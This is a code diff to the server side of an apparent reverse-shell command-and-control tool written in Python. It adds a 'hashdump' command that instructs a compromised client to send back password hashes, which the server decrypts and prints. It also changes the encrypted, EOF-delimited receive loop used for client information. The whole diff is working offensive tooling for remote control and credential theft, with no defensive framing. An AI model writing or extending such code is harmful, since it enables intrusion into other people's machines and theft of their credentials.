@@ -40,9 +40,14 @@ class ReverseShellServer:
 
     def get_client_info(self, conn):
         try:
-            conn.send(AESCipher.encrypt("client_info").encode("utf-8"))
-            data = conn.recv(4096).decode("utf-8")
-            decrypted_data = AESCipher.decrypt(data)
+            data = b""
+            while True:
+                part = conn.recv(1024)
+                if part.endswith(AESCipher.encrypt("EOF").encode("utf-8")):
+                    data += part[: -len(AESCipher.encrypt("EOF").encode("utf-8"))]
+                    break
+                data += part
+            decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
             hostname, os_type = decrypted_data.split("|")
             return hostname.strip(), os_type.strip()
         except Exception as e:
@@ -131,6 +136,8 @@ class ReverseShellServer:
                 self.handle_ipconfig(conn, client_id)
             elif agent_command == "search":
                 self.handle_search(args, conn)
+            elif agent_command == "hashdump":
+                self.handle_hashdump(conn)
             else:
                 self.send_command(agent_command + " " + args, conn)
         else:
@@ -228,6 +235,22 @@ class ReverseShellServer:
             print(decrypted_data)
         except Exception as e:
             print(f"[x] Failed to decrypt search data: {e}")
+
+    def handle_hashdump(self, conn):
+        conn.send(AESCipher.encrypt("hashdump").encode("utf-8"))
+        data = b""
+        while True:
+            part = conn.recv(1024)
+            if part.endswith(AESCipher.encrypt("EOF").encode("utf-8")):
+                data += part[: -len(AESCipher.encrypt("EOF").encode("utf-8"))]
+                break
+            data += part
+        try:
+            decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
+            print("[+] Hashdump Results:")
+            print(decrypted_data)
+        except Exception as e:
+            print(f"[x] Failed to decrypt hashdump data: {e}")
 
     def interactive_shell(self, conn):
         while True:
